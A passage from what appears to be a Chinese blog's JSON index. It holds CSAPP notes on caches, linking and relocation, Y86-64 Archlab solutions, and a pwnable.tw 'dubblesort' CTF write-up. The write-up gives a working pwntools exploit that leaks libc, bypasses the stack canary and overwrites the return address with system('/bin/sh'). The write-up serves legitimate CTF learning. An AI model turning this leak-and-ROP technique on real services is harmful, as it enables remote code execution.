a4 = A[k][j+3]; a5 = A[k][j+4]; a6 = A[k][j+5]; a7 = A[k][j+6]; a8 = A[k][j+7]; B[j][k] = a1; B[j+1][k] = a2; B[j+2][k] = a3; B[j+3][k] = a4; B[j+4][k] = a5; B[j+5][k] = a6; B[j+6][k] = a7; B[j+7][k] = a8; } } } } else if(N==64) { for(i=0; i\u003cN; i+=8) { for(j=0; j\u003cM; j+=8) { for(k=j; k\u003cj+4; ++k) { a1=A[k][i]; a2=A[k][i+1]; a3=A[k][i+2]; a4=A[k][i+3]; a5=A[k][i+4]; a6=A[k][i+5]; a7=A[k][i+6]; a8=A[k][i+7]; B[i][k]=a1; B[i][k+4]=a5; B[i+1][k]=a2; B[i+1][k+4]=a6; B[i+2][k]=a3; B[i+2][k+4]=a7; B[i+3][k]=a4; B[i+3][k+4]=a8; } for(k=i; k\u003ci+4; ++k) { a1=B[k][j+4]; a2=B[k][j+5]; a3=B[k][j+6]; a4=B[k][j+7]; a5=A[j+4][k]; a6=A[j+5][k]; a7=A[j+6][k]; a8=A[j+7][k]; B[k][j+4]=a5; B[k][j+5]=a6; B[k][j+6]=a7; B[k][j+7]=a8; B[k+4][j]=a1; B[k+4][j+1]=a2; B[k+4][j+2]=a3; B[k+4][j+3]=a4; } for(k=i+4; k\u003ci+8; ++k) { a1=A[j+4][k]; a2=A[j+5][k]; a3=A[j+6][k]; a4=A[j+7][k]; B[k][j+4]=a1; B[k][j+5]=a2; B[k][j+6]=a3; B[k][j+7]=a4; } } } } else if(M==61) { for(i=0; i\u003cN; i+=16) { for(j=0; j\u003cM; j+=16) { for(k=i; k\u003ci+16\u0026\u0026k\u003cN; ++k) { for(h=j; h\u003cj+16\u0026\u0026h\u003cM; ++h) { B[h][k] = A[k][h]; } } } } } } ","date":"2021-02-14","objectID":"/csapp-cachelab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Cachelab","uri":"/csapp-cachelab/#part-b"},{"categories":["Pwning"],"content":"Lecture 08: Linking和学过的pwn的一部分重合了，所以只记录新的知识。 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#lecture-08-linking"},{"categories":["Pwning"],"content":"符号和符号表符号表.symtab中的每个条目具有以下格式： typedef strcut{ int name; char type:4, binding:4; char reserved; short section; long value; long size; }Elf64_Symbol; **name：**保存符号的名字，是.strtab的字节偏移量 **type：**说明该符号的类型，是函数、变量还是数据节等等 **binding：**说明该符号是局部还是全局的 **value：**对于可重定位目标文件而言，是定义该符号的节到该符号的偏移量（比如函数就是在.text中，初始化的变量在.data，未初始化的变量在.bss中）；对于可执行目标文件而言，是绝对运行形式地址。 **size：**是符号的值的字节数目。（通过value和size就能获得该符号的值） **section：**说明该符号保存在哪个节中，是节头部表中的偏移量。 对于像Linux LD这样的静态链接器（Static Linker），是以一组可重定位目标文件和命令参数为输入，生成一个完全链接的、可以加载和运行的可执行目标文件作为输出。为了构造可执行目标文件，链接器有两个任务： **符号解析（Symbol Resolution）：**将每个符号引用和一个符号定义关联起来 **重定位（Relocation）：编译器和汇编器生成从地址0开始的代码和数据节，链接器会对代码、数据节、符号分配内存地址，然后使用汇编器产生的重定位条目（Relocation Entry）**的指令，修改所有对这些符号的引用，使得它们指向正确的内存位置。 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#符号和符号表"},{"categories":["Pwning"],"content":"符号解析链接器符号解析是将每个符号引用与输入的所有可重定位目标文件的符号表中的一个确定的符号定义关联起来。 编译器会向汇编器输出每个全局符号是强（Strong）还是弱（Weak），而汇编器会把这些信息隐式编码在可重定位目标文件的符号表中。函数和已初始化的全局符号是强符号，未初始化的全局符号是弱符号。 然后链接器通过以下规则来处理在多个可重定位目标文件中重复定义的全局符号： 不允许有多个同名的强符号，如果存在，则链接器会报错 如果有一个强符号和多个弱符号同名，则符号选择强符号的定义 如果有多个弱符号同名，符号就随机选择一个弱符号的定义 关于这部分，书上举了很多例子便于理解。 判断符号采用哪种定义： 在各个文件中确定同名全局符号的强弱，其中符号和初始化的全局符号为强符号，未初始化的全局符号为弱符号 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#符号解析"},{"categories":["Pwning"],"content":"静态库的链接与解析引用在符号解析阶段，链接器会维护一个可重定位目标文件的集合E，一个引用了但是还未定义的符号集合U，一个前面输入文件中已经定义的符号集合D，然后在命令行中从左到右依次扫描可重定位目标文件和存档文件： 如果输入文件是可重定位目标文件，链接器就将其添加到E中，然后根据该文件的符号表来修改U和D，然后继续下一个输入文件。 如果输入文件是存档文件，则链接器会依次扫描存档文件中的成员m，如果m定义了U中的一个符号，则将m添加到E中，然后根据m的符号表来修改U和D。最后没有包含在E中的成员就会被丢弃，然后继续下一个输入文件。 如果链接器扫描完毕，U中还存在没有确定定义的符号，则链接器会报错并终止，否则链接器会合并和重定位E中的目标文件，得到可执行目标文件。 根据以上过程的描述，我们需要小心命令行上库和目标文件的顺序，要保证前面输入文件中未解析的符号能在后续输入文件中进行解析，否则会出现链接错误，一般是将库放在后面，如果库之间存在依赖，也要注意库之间的顺序，并且为了满足依赖关系，可以在命令行上重复库。 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:2:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#静态库的链接与解析引用"},{"categories":["Pwning"],"content":"重定位当链接器完成符号解析时，就能确定在多个目标文件中重定义的全局符号的解析，以及获得静态库中需要的目标模块，此时所有符号引用都能和一个符号定义关联起来了。此时开始重定位步骤，包括： 链接器将所有目标模块中相同类型的节合并成同一类型的新的聚合节，比如将所有输入目标模块的.data节聚合成可执行文件中的.data节，其他节也如此操作。 此时链接器知道代码节和数据节的确切大小，就将运行时内存地址赋给新的聚合节，以及输入模块定义的每个符号。此时程序的每条指令和全局变量都有唯一的运行时内存地址了。 记得之前可重定位目标文件中，由于编译器和汇编器并不知道符号的运行时内存地址，所以使用一个占位符来设置符号引用的地址，而当前链接器已为符号分配了内存地址，所以链接器需要修改代码节和数据节中对每个符号的引用，使它们指向正确的运行时内存地址。 当汇编器生成目标模块时，它无法确定数据和代码最终会放在内存的什么位置，也无法确定该模块引用外部定义的函数和全局变量的位置，所以汇编器先用占位符来占领位置，然后对地址未知的符号产生一个重定位条目（Relocation Entry），代码的重定位条目会保存在.rel.text节中，已初始化数据的重定位条目会保存在rel.data.节中。 typedef struct{ long offset; long type:32; symbol:32; long addend; }Elf_Rela; 其中，offset表示要修改符号引用的内存地址，type表示重定位的类型，symbol是符号表的索引值，表示引用的符号，可以通过该符号获得真实的内存地址，addend是一个有符号常数，有些重定位需要使用这个参数来修改引用位置。 int sum(int *a, int n); int array[2] = {1, 2}; int main() { int val = sum(array, 2); return val; } 我们可以通过objdump -dx main.o来得到main.o的反汇编代码，可以发现该函数中无法确定array和其他目标模块中定义的函数sum在内存中的地址，所以会对array和sum产生重定位条目 sub $0x8,%rsp mov $0x2,%esi mov $0x0,%edi a:R_X86_64_32 array callq 13\u003cmain+0x13\u003e f:R_X86_64_PC32 sum-0x4 add $0x8,%rsp retq R_X86_64_PC32 该重定位条目主要用来产生32位PC相对地址的引用，即函数调用时的重定位。 其中call指令的开始地址处于节偏移0xe处，然后有一个字节的操作码e8，后面跟着的就是函数sum的32位PC相对引用的占位符，所以链接器修改的位置在当前节偏移0xf处。该重定位条目r包含以下字段 r.offset = 0xf //该值是当前节的偏移量，定位到重定位的位置 r.symbol = sum //保存的是要重定位的符号 r.type = R_X86_64_PC32 //保存的是重定位的类型 r.addend = -4 当前链接器已经确定了各个节和符号的的内存地址，该代码处于.text节中，则我们可以通过.text和r.offset的值来确定占位符的内存地址 ADDR(s) = ADDR(.text) = 0x4004d0 refaddr = ADDR(s) + r.offset = 0x4004d0 + 0xf = 0x4004df 然后我们需要计算占位符的内容，根据相对地址的计算方法，可以知道占位符的内容是目标地址减去当前PC的下一条指令的地址。可以通过ADDR(r.symbol)来获得目标地址，即sum函数的地址，可以通过refaddr减去4字节来获得下一指令的地址，然后可以通过以下计算公式来计算占位符内容 refptr = s + r.offset //占位符的指针 ADDR(r.symbol) = ADDR(sum) = 0x4004e8 *refptr = (unsigned)(ADDR(s.symbol) + r.addend - refaddr) = (unsigned)(0x4004e8 + (-4) - 0x4004df) = (unsigned) 0x5 R_X86_64_32 该重定位条目主要用来产生32位绝对地址的引用，即数组的重定位。 使用数组array的指令处于.text节偏移0x9处，后面有一个字节的操作码，后面跟着的就是数组array的32位绝对地址的引用的占位符，所以链接器修改的位置在当前节偏移0xa处。该重定位条目r包含以下字段 r.offset = 0xa r.symbol = array r.type = R_X86_64_32 r.added = 0 我们可以通过r.symbol的地址来确定数组array的内存地址，然后直接将该内存地址保存到占位符中，即 refptr = s + r.offset //占位符的指针 *refptr = (unsigned)(ADDR(r.symbol) + r.addend) = (unsigned) 0x601018 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#重定位"},{"categories":["Pwning"],"content":"库打桩Linux链接器支持**库打桩（Library Interpositioning）**技术，允许你截获对共享库函数的调用，替换成自己的代码。基本思想为：创建一个与共享库函数相同函数原型的包装函数，使得系统调用包装函数，而不是调用目标函数。 ","date":"2021-02-14","objectID":"/csapp-lecture-08/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 08","uri":"/csapp-lecture-08/#库打桩"},{"categories":["Pwning"],"content":"Lecture 07: Cache Memories","date":"2021-02-13","objectID":"/csapp-lecture-07/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#lecture-07-cache-memories"},{"categories":["Pwning"],"content":"高速缓存存储器","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#高速缓存存储器"},{"categories":["Pwning"],"content":"通用的高速缓存存储器组织结构较早期的计算机系统的存储器层次结构只有三层：CPU寄存器、主存和磁盘，但是随着CPU的发展，使得主存和CPU之间的读取速度逐渐拉大，由此在CPU和主存之间插入一个小而快速的SRAM高速缓存存储器，称为L1高速缓存，随着后续的发展，又增加了L2高速缓存和L3高速缓存。 考虑一个计算机系统，其中每个存储器地址有 m 位，形成 M=2mM=2m 个不同的地址。这样一个机器的高速缓存被组织成一个有 S=2sS=2s 个高速缓存组（cache set）的数组。每个组包含 E 个高速缓存行（cache line）。每个行是由一个 B=2bB=2b 字节的数据块（block）组成的，一个有效位（valid bit）指明这个行是否包含有意义的信息（为了方便），还有 t = m-(b+s) 个标记位（tag bit）（是当前块的内存地址的位的一个子集），它们唯一地标识存储在这个高速缓存行中的块。该高速缓存的结构可以通过元组(S, E, B, m)来描述，且容量C为所有块的大小之和，$C=SEB$。 参数 S 和 B 将 m 个地址位分为了三个字段。 地址 A 中有 s 个组索引位是一个到 S 个组的数组的索引，是一个无符号整数。 地址 A 中的 t 个标记位告诉我们这个组中的哪一行包含这个字。当且仅当设置了有效位并且该行的标记位与地址 A 中的标记位相匹配时，组中的这一行才包含这个字。(Valid bits are also used in the context of multiprocessors) 一旦我们在由组索引标识的组中定位了由标号所标识的行，那么 b 个块偏移位给出了 B 个字节的数据块中的字偏移。 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#通用的高速缓存存储器组织结构"},{"categories":["Pwning"],"content":"直接映射高速缓存（single block/line per set）当E=1 时，高速缓存称为直接映射高速缓存（Direct-mapped Cache），每个高速缓存组中只含有一个高速缓存行。 组选择 行匹配 字抽取 如果找到了对应的高速缓存行，则可以将b位表示为无符号数作为块偏移量，得到对应位置的字。最后，如果不命中则进行行替换，需要驱逐出一个现存的行。 x 与 y 块之间的抖动（thrash），即高速缓存反复地加载和驱逐相同的高速缓存块的组。 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#直接映射高速缓存single-blockline-per-set"},{"categories":["Pwning"],"content":"组相联高速缓存（E-way Set-Associative Cache or E blocks/lines per set）直接映射高速缓存的冲突不命中是由于每个高速缓存组中只有一个高速缓存行，所以扩大E的值，当$1\u003cE\u003cC/B$ 时，称为E路组相联高速缓存（Set Associative Cache），此时需要额外的硬件逻辑来进行行匹配，所以更加昂贵。（$E\u003cC/B$即要求$S\u003e1$) 当缓存不命中时需要进行缓存行替换，如果对应的高速缓存组中有空的高速缓存行，则直接将其保存到空行中。但是如果没有空行，就要考虑合适的替换策略： 最简单的替换策略是随机选择要替换的行 **最不常使用（Least-Frequently-Used，LFU）策略：**替换过去某个时间窗口内引用次数最少的一行。 **最近最少使用（Least-Recently-Used，LRU）策略：**替换最后一次访问时间最久远的那一行 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#组相联高速缓存e-way-set-associative-cache-or-e-blockslines-per-set"},{"categories":["Pwning"],"content":"全相联高速缓存**全相联高速缓存（Full Associative Cache）**是用一个包含所有高速缓存行的组组成的，其中$E=C/B$ ，即$S=1$ 。 由于全相联高速缓存只有一个组，所以不包含组索引编码 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#全相联高速缓存"},{"categories":["Pwning"],"content":"写操作当CPU想要对地址A进行写操作时，会通过地址A判断是否缓存了该地址，如果缓存了称为写命中（Write Hit），否则称为写不命中（Write Miss）。 **写命中：**高速缓存会先更新缓存的副本，然后可以采取不同方法更新下一层的副本 **直写（Write-Though）：**立即更新下一层的副本值。缺点是每次写都会引起总线流量。 写回（Write-Back）：为每个高速缓存行维护一个修改位（Dirty Bit），表明这个高速缓存块是否被修改。当被修改的高速缓存块被驱逐时，会查看修改位，判断该块是否被修改，只有被修改才会更新下一层的副本值。能够显著减少总线流量，但是复杂性高。 写不命中： **写不分配（Not-Write-Allocate）：**直接将字写到下一层中。 **写分配（Write-Allocate）：**加载相应的下一层的块到当前层的高速缓存中，然后更新当前高速缓存块。得益于空间局部性，进行一次写分配后，下一次有较高几率会写命中，但是缺点是每次写不命中就要将块从第一层向上传输。 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#写操作"},{"categories":["Pwning"],"content":"真实高速缓存结构可以将高速缓存分成以下几种： **i-cache：**只保存指令的高速缓存 **d-cache：**只保存程序数据的高速缓存 **Unified Cache：**即能保存指令，也能保存程序数据的高速缓存 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#真实高速缓存结构"},{"categories":["Pwning"],"content":"参数对性能的影响衡量高速缓存的指标有： **命中率（Hit Rate）：**内存引用命中的比率，命中数量/引用数量。 **不命中率（Miss Rate）：**内存引用不命中的比率，不命中数量/引用数量。通常，L1高速缓存为3~10%，L2高速缓存为\u003c1%。 命中时间（Hit Time）： 从高速缓存传输一个字到CPU的时间，包括组选择、行匹配和字选择时间。通常，L1高速缓存需要4个时钟周期，L2高速缓存需要10个时钟周期。 **不命中处罚（Miss Penalty）：**当缓存不命中时，要从下一层的存储结构中传输对应块到当前层中，需要额外的时间（不包含命中时间）。通常，主存需要50~200个时钟周期。 想要编写高速缓存友好（Cache Friendly）的代码，基本方法为： 让最常见的情况运行得快，将注意力集中在核心函数的循环中 尽可能减少每个循环内部的缓存不命中，可以对局部变量反复引用，因为编译器会将其保存到寄存器中，其他的变量最好使用步长为1的引用模式。 之后就是大段的数据分析不同的参数对性能的影响，这里最重要的一点是命中率，命中和不命中两者对性能影响很大，比如99%命中率的性能会比97%命中率高两倍。 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:1:7","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#参数对性能的影响"},{"categories":["Pwning"],"content":"改善程序重新排列循环来改善空间局部性 对循环重排列，来提高空间局部性，增加命中率。 使用分块来提高时间局部性 分块的主要思想是将一个程序中的数据结构组织成大的片（Chunk），使得能够将一个片加载到L1高速缓存中，并在这个偏重进行读写。分块降低不命中率是因为加载一个块后，就反复使用该块，提高了空间局部性。 ","date":"2021-02-13","objectID":"/csapp-lecture-07/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 07","uri":"/csapp-lecture-07/#改善程序"},{"categories":["Writeups"],"content":" Challenges Tricks pwnable.tw-dubblesort canary 新年快乐！没想到吧！春节我也不消停…不过做题的速度要变慢了，Sakura师傅还要交这周的作业，下周放一个假，打算把how2heap学完，做点例题。 ","date":"2021-02-12","objectID":"/challenges-100-week-6/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#"},{"categories":["Writeups"],"content":"dubblesort这个出题人的英文是不是不太好？ ","date":"2021-02-12","objectID":"/challenges-100-week-6/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#dubblesort"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort' Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 所有保护全开。 ","date":"2021-02-12","objectID":"/challenges-100-week-6/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#checksec"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { int count; // eax unsigned int *v4; // edi unsigned int i; // esi unsigned int j; // esi int result; // eax unsigned int _count; // [esp+18h] [ebp-74h] BYREF unsigned int num[8]; // [esp+1Ch] [ebp-70h] BYREF char buf[64]; // [esp+3Ch] [ebp-50h] BYREF unsigned int v11; // [esp+7Ch] [ebp-10h] v11 = __readgsdword(0x14u); init(); __printf_chk(1, (int)\"What your name :\"); read(0, buf, 0x40u); __printf_chk(1, (int)\"Hello %s,How many numbers do you what to sort :\"); __isoc99_scanf(\"%u\", \u0026_count); count = _count; if ( _count ) { v4 = num; for ( i = 0; i \u003c _count; ++i ) { __printf_chk(1, (int)\"Enter the %d number : \"); fflush(stdout); __isoc99_scanf(\"%u\", v4); count = _count; ++v4; } } bubblesort(num, count); puts(\"Result :\"); if ( _count ) { for ( j = 0; j \u003c _count; ++j ) __printf_chk(1, (int)\"%u \"); } result = 0; if ( __readgsdword(0x14u) != v11 ) check_canary(); return result; 程序看上去是没有任何问题，漏洞在程序函数的实现上。 使用read函数读取的buf是用\\x0a进行截断的。而printf在输出字符串的时候是用\\x00进行截断，所以可以用来泄露栈上的内容。而通过输入数字的数量我们可以实现栈溢出。 在我们输入的字符串的附近： 0f:003c│ ecx esi 0xffffcdac ◂— 'aaaabbbb\\n' 10:0040│ 0xffffcdb0 ◂— 'bbbb\\n' 11:0044│ 0xffffcdb4 ◂— 0xa /* '\\n' */ 12:0048│ 0xffffcdb8 —▸ 0x56555034 ◂— push es 13:004c│ 0xffffcdbc ◂— 0x16 14:0050│ 0xffffcdc0 ◂— 0x8000 15:0054│ 0xffffcdc4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 有一个(_GLOBAL_OFFSET_TABLE_)，明显它的地址的libc中的，查看它在libc中的偏移。 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56555000 0x56556000 r-xp 1000 0 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0x56556000 0x56557000 r--p 1000 0 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0x56557000 0x56558000 rw-p 1000 1000 /home/niebelungen/Desktop/pwnable.tw/dubblesort/dubblesort 0xf7e01000 0xf7e02000 rw-p 1000 0 0xf7e02000 0xf7fb2000 r-xp 1b0000 0 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb2000 0xf7fb3000 ---p 1000 1b0000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb3000 0xf7fb5000 r--p 2000 1b0000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb5000 0xf7fb6000 rw-p 1000 1b2000 /lib/i386-linux-gnu/libc-2.23.so 0xf7fb5000-0xf7e02000=0x1b3000，这里我们加载的是本地libc所以查看libc的节信息。 [32] .got.plt PROGBITS 001b3000 1b2000 000030 04 WA 0 0 4 其为.got.plt节，再查看服务器上libc的偏移 [31] .got.plt PROGBITS 001b0000 1af000 000030 04 WA 0 0 4 .got This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols. .plt This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.) .got.plt This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section. .text:00000AF9 mov eax, 0 .text:00000AFE mov edx, [esp+7Ch] .text:00000B02 xor edx, large gs:14h .text:00000B09 jz short loc_B10 .text:00000B0B call check_canary 经过调试，发现canary被放入了esp+0x7c的位置。因为会进行排序，而为了修改返回地址，我们会遇到canary。所以在canary前输入比其小的数字‘0’，通过输入符号绕过canary，之后输入比canary大的内容。 ","date":"2021-02-12","objectID":"/challenges-100-week-6/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./dubblesort' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10101) elf = ELF(binary,checksec=False) libc=ELF('./libc_32.so.6',checksec=False) p.sendline('a'*0x18) libcbase=u32(p.recvuntil('\\xf7')[-4:])-0xa-0x1b0000 print hex(libcbase) system=libcbase+libc.symbols['system'] bin_sh=libcbase+0x00158e8b p.sendline('35') payload='0'*0x18+'-'+9*str(system)+str(bin_sh) for i in range(24): p.sendline('0') p.sendline('-') for i in range(9): p.sendline(str(system)) p.sendline(str(bin_sh)) p.interactive() ","date":"2021-02-12","objectID":"/challenges-100-week-6/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 6","uri":"/challenges-100-week-6/#exp"},{"categories":["Pwning"],"content":"CSAPP-Archlab","date":"2021-02-08","objectID":"/csapp-archlab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#csapp-archlab"},{"categories":["Pwning"],"content":"part A使用Y86-64指令集实现example.c中的函数 /* * Architecture Lab: Part A * * High level specs for the functions that the students will rewrite * in Y86-64 assembly language */ /* $begin examples */ /* linked list element */ typedef struct ELE { long val; struct ELE *next; } *list_ptr; /* sum_list - Sum the elements of a linked list */ long sum_list(list_ptr ls) { long val = 0; while (ls) { val += ls-\u003eval; ls = ls-\u003enext; } return val; } /* rsum_list - Recursive version of sum_list */ long rsum_list(list_ptr ls) { if (!ls) return 0; else { long val = ls-\u003eval; long rest = rsum_list(ls-\u003enext); return val + rest; } } /* copy_block - Copy src to dest and return xor checksum of src */ long copy_block(long *src, long *dest, long len) { long result = 0; while (len \u003e 0) { long val = *src++; *dest++ = val; result ^= val; len--; } return result; } /* $end examples */ ","date":"2021-02-08","objectID":"/csapp-archlab/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-a"},{"categories":["Pwning"],"content":"sum_list .pos 0 irmovq stack,%rsp call main halt #link list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call sum_list ret sum_list: pushq %r10 irmovq $0x0,%rax jmp test sum: mrmovq (%rdi),%r10 addq %r10,%rax #val+=ls.val mrmovq 8(%rdi),%rdi #ls=ls.next test: andq %rdi,%rdi jne sum popq %r10 ret .pos 0x200 stack: 思路其实很简单，对着c代码写就可，这里使用了while循环的优化。为了保存原来寄存器的值要先将其入栈。 niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis sum.yo Stopped in 28 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 Changes to memory: 0x01f0: 0x0000000000000000 0x000000000000005b 0x01f8: 0x0000000000000000 0x0000000000000013 rax中的结果是正确的。 ","date":"2021-02-08","objectID":"/csapp-archlab/:1:1","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#sum_list"},{"categories":["Pwning"],"content":"rsum_list .pos 0 irmovq stack,%rsp call main halt #link list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call rsum_list ret rsum_list: pushq %r10 xor %rax,%rax #irmovq $0x0,%rax andq %rdi,%rdi je end mrmovq (%rdi),%r10 mrmovq 8(%rdi),%rdi call rsum_list addq %r10,%rax end: popq %r10 ret .pos 0x200 stack: 使用递归的方式完成求和，那么rdi和rax的值都是变化的，这里要想到通过多余的寄存器保存当前的值，便于通过addq进行相加。 niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis rsum.yo Stopped in 42 steps at PC = 0x13. Status 'HLT', CC Z=0 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 Changes to memory: 0x01b8: 0x0000000000000000 0x0000000000000c00 0x01c0: 0x0000000000000000 0x0000000000000088 0x01c8: 0x0000000000000000 0x00000000000000b0 0x01d0: 0x0000000000000000 0x0000000000000088 0x01d8: 0x0000000000000000 0x000000000000000a 0x01e0: 0x0000000000000000 0x0000000000000088 0x01f0: 0x0000000000000000 0x000000000000005b 0x01f8: 0x0000000000000000 0x0000000000000013 ","date":"2021-02-08","objectID":"/csapp-archlab/:1:2","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#rsum_list"},{"categories":["Pwning"],"content":"copy_block .pos 0 irmovq stack,%rsp call main halt .align 8 # Source block src: .quad 0x00a .quad 0x0b0 .quad 0xc00 # Destination block dest: .quad 0x111 .quad 0x222 .quad 0x333 main: irmovq $0x3,%rdx irmovq dest,%rsi irmovq src,%rdi call copy_block ret copy_block: pushq %r8 pushq %r9 pushq %r10 irmovq $0x8,%r8 irmovq $0x1,%r9 xorq %rax,%rax jmp test copy: mrmovq (%rdi),%r10 rmmovq %r10,(%rsi) xorq %r10,%rax addq %r8,%rdi addq %r8,%rsi subq %r9,%rdx test: andq %rdx,%rdx jne copy popq %r10 popq %r9 popq %r8 ret .pos 0x200 stack: niebelungen@ubuntu:~/Desktop/archlab-handout/sim/misc$ ./yis copy_block.yo Stopped in 45 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000200 %rsi: 0x0000000000000000 0x0000000000000048 %rdi: 0x0000000000000000 0x0000000000000030 Changes to memory: 0x0030: 0x0000000000000111 0x000000000000000a 0x0038: 0x0000000000000222 0x00000000000000b0 0x0040: 0x0000000000000333 0x0000000000000c00 0x01f0: 0x0000000000000000 0x000000000000006f 0x01f8: 0x0000000000000000 0x0000000000000013 ","date":"2021-02-08","objectID":"/csapp-archlab/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#copy_block"},{"categories":["Pwning"],"content":"part B修改seq-fun.hcl使其支持iaddq 阶段 iaddq V, rB Fetch icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valC ← $M_s[PC+2]$ valP ← PC+10 Decode valB ← $R[rB]$ Execute valE ← valC+valB Set CC Memory Write Back R[rB] ← valE PC Update PC ← valP 填好表格，对应阶段进行修改就可以了。 niebelungen@ubuntu:~/Desktop/archlab-handout/sim/seq$ (cd ../ptest; make SIM=../seq/ssim TFLAGS=-i) ./optest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 58 ISA Checks Succeed ./jtest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 96 ISA Checks Succeed ./ctest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 22 ISA Checks Succeed ./htest.pl -s ../seq/ssim -i Simulating with ../seq/ssim All 756 ISA Checks Succeed ","date":"2021-02-08","objectID":"/csapp-archlab/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-b"},{"categories":["Pwning"],"content":"part C修改ncopy.ys使得ncopy函数尽可能快。首先，可以在pipe-full.hcl文件中增加iaddq指令。 xorq %rax,%rax # count = 0; andq %rdx,%rdx # len \u003c= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val \u003c= 0? jle Npos # if so, goto Npos: iaddq $1, %rax # count++ Npos: iaddq $-1, %rdx # len-- iaddq $8, %rdi # src++ iaddq $8, %rsi # dst++ andq %rdx,%rdx # len \u003e 0? jg Loop # if so, goto 